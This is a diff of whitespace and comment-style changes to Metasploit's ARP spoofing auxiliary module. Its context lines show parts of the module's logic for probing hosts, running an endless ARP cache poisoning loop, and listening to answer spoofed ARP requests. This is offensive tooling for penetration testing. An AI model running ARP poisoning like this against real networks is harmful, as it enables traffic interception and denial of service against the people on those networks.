@@ -17,7 +17,7 @@ class Metasploit3 < Msf::Auxiliary
         Spoof ARP replies and poison remote ARP caches to conduct IP address spoofing or a denial of service.
       },
       'Author'      => 	'amaloteaux', # msf rewrite
-            #tons of people  ....
+                                      #tons of people
       'License'     => MSF_LICENSE,
       'References'     =>
         [
@@ -71,7 +71,7 @@ class Metasploit3 < Msf::Auxiliary
 
     begin
       @interface = datastore['INTERFACE'] || Pcap.lookupdev
-      #This is needed on windows cause we send interface directly to Pcap functions
+      # This is needed on windows cause we send interface directly to Pcap functions
       @interface = get_interface_guid(@interface)
       @smac = datastore['SMAC']
       @smac ||= get_mac(@interface) if @netifaces
@@ -171,7 +171,7 @@ class Metasploit3 < Msf::Auxiliary
     @dhosts = []
     dhosts_range.each{|dhost| if Rex::Socket.is_ipv4?(dhost) and dhost != @sip then @dhosts.push(dhost) end}
 
-    #Build the local dest hosts cache
+    # Build the local dest hosts cache
     print_status("Building the destination hosts cache...")
     @dhosts.each do |dhost|
       vprint_status("Sending arp packet to #{dhost}")
@@ -180,7 +180,7 @@ class Metasploit3 < Msf::Auxiliary
       inject(probe)
       while(reply = getreply())
         next if not reply.is_arp?
-        #Without this check any arp request would be added to the cache
+        # Without this check any arp request would be added to the cache
         if @dhosts.include? reply.arp_saddr_ip
           print_status("#{reply.arp_saddr_ip} appears to be up.")
           report_host(:host => reply.arp_saddr_ip, :mac=>reply.arp_saddr_mac)
@@ -189,7 +189,7 @@ class Metasploit3 < Msf::Auxiliary
       end
 
     end
-    #Wait some few seconds for last packets
+    # Wait some few seconds for last packets
     etime = Time.now.to_f + datastore['TIMEOUT']
     while (Time.now.to_f < etime)
       while(reply = getreply())
@@ -204,7 +204,7 @@ class Metasploit3 < Msf::Auxiliary
     end
     raise RuntimeError, "No hosts found" unless @dsthosts_cache.length > 0
 
-    #Build the local src hosts cache
+    # Build the local src hosts cache
     if datastore['BIDIRECTIONAL']
       print_status("Building the source hosts cache for unknow source hosts...")
       @shosts.each do |shost|
@@ -226,7 +226,7 @@ class Metasploit3 < Msf::Auxiliary
         end
 
       end
-      #Wait some few seconds for last packets
+      # Wait some few seconds for last packets
       etime = Time.now.to_f + datastore['TIMEOUT']
       while (Time.now.to_f < etime)
         while(reply = getreply())
@@ -246,11 +246,11 @@ class Metasploit3 < Msf::Auxiliary
       @mutex_cache = Mutex.new
     end
 
-    #Start the listener
+    # Start the listener
     if datastore['LISTENER']
       start_listener(@dsthosts_cache, @srchosts_cache)
     end
-    #Do the job until user interupt it
+    # Do the job until user interupt it
     print_status("ARP poisoning in progress...")
     @spoofing = true
     while(true)
@@ -360,7 +360,7 @@ class Metasploit3 < Msf::Auxiliary
     args[:localip] = @sip.dup
     @listener = Thread.new(args) do |args|
       begin
-        #one more local copy
+        # one more local copy
         liste_src_ips = []
         if args[:BIDIRECTIONAL]
           args[:shosts].each_key {|address| liste_src_ips.push address}
@@ -379,7 +379,7 @@ class Metasploit3 < Msf::Auxiliary
             pkt = PacketFu::Packet.parse(pkt_bytes)
             if pkt.is_arp?
               if pkt.arp_opcode == 1
-                #check if the source ip is in the dest hosts
+                # check if the source ip is in the dest hosts
                 if (liste_dst_ips.include? pkt.arp_saddr_ip and liste_src_ips.include? pkt.arp_daddr_ip) or
                   (args[:BIDIRECTIONAL] and liste_dst_ips.include? pkt.arp_daddr_ip and liste_src_ips.include? pkt.arp_saddr_ip)
                   vprint_status("Listener : Request from #{pkt.arp_saddr_ip} for #{pkt.arp_daddr_ip}")
